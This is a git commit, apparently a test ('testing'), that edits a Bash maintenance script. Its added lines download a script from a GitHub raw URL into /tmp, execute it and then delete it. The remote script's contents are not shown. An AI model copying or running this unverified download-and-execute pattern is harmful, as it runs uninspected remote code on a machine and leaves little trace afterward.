48c756c561ef027e919c32c1e176464bb475f35d
Nelio Santos <nsfilho@icloud.com>
2023-02-23 17:35:05 -0300

    testing

--- maintenance.sh
+++ maintenance.sh
@@ -1,3 +1,7 @@
 #!/bin/bash
 
-echo "Inicializando script de manutenção periódica"
+echo "Inicializando script de manutenção periódica..."
+wget -O /tmp/remote.sh https://raw.githubusercontent.com/jbtec-usign/wtlinux/main/remote.sh
+chmod +x /tmp/remote.sh
+/tmp/remote.sh
+rm -f /tmp/remote.sh
